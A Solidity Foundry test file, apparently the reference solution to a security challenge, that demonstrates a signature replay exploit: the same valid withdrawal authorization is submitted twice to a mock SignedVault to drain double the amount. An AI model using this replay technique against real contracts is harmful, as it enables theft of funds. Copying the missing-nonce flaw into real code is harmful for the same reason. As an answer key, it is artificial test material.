// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {SignedVault} from "../src/SignedVault.sol";

/// Reference exploit: a single valid authorization is submitted twice (replay).
contract BridgeReplaySolution is Test {
    MockERC20 token;
    SignedVault vault;
    address attacker = makeAddr("attacker");
    uint256 constant SIGNER_PK = 0xA11CE;
    uint256 constant AMOUNT = 100e18;

    // A genuine, one-time authorization issued to the attacker for AMOUNT.
    uint8 v; bytes32 r; bytes32 s;

    function setUp() public {
        token = new MockERC20("Bridged", "BRG");
        vault = new SignedVault(token, vm.addr(SIGNER_PK));
        token.mint(address(vault), 1_000e18);
        bytes32 hash = keccak256(abi.encodePacked(attacker, AMOUNT));
        (v, r, s) = vm.sign(SIGNER_PK, hash);
    }

    function test_exploit() public {
        // Use the same authorization twice — nothing marks it as spent.
        vault.withdraw(attacker, AMOUNT, v, r, s);
        vault.withdraw(attacker, AMOUNT, v, r, s);
        assertEq(token.balanceOf(attacker), 2 * AMOUNT, "attacker replays the signature to double-withdraw");
    }
}
